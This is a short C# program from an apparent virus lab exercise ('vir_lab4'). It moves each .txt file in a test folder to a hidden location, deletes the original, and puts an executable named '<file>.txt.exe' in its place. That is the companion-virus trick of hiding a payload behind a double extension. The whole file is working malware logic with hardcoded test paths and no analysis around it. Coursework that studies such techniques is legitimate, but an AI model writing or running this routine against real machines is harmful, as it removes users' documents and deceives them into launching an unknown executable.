using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace vir_lab4
{
    class Program
    {
        private const string _publicFolderPath = "C:\\Users\\Lavrov\\Desktop\\Test";
        private const string _privateFolderPath = "C:\\Users\\Lavrov\\Desktop\\Test1";
        private static List<string> Items = new List<string>();

        static void Main(string[] args)
        {

            DirectoryInfo dinfo = new DirectoryInfo(_publicFolderPath);

            FileInfo[] Files = dinfo.GetFiles("*.txt");

            foreach (FileInfo file in Files)
            {
                Items.Add(file.Name);

                var currentFilePath = Path.Combine(_privateFolderPath, file.Name);

                byte[] mass = File.ReadAllBytes(file.FullName);

                File.WriteAllBytes(currentFilePath, mass);

                DirectoryInfo privateInfo = new DirectoryInfo(_privateFolderPath);

                FileInfo privateExe = privateInfo.GetFiles("*.exe")[0];

                var privateFilePath = Path.Combine(_privateFolderPath, privateExe.Name);
                var newPrivateFilePath = Path.Combine(_publicFolderPath, file.Name + ".exe");

                byte[] privateMass = File.ReadAllBytes(privateFilePath);

                File.WriteAllBytes(newPrivateFilePath, privateMass);

                File.Delete(file.FullName);
            }
        }
    }
}
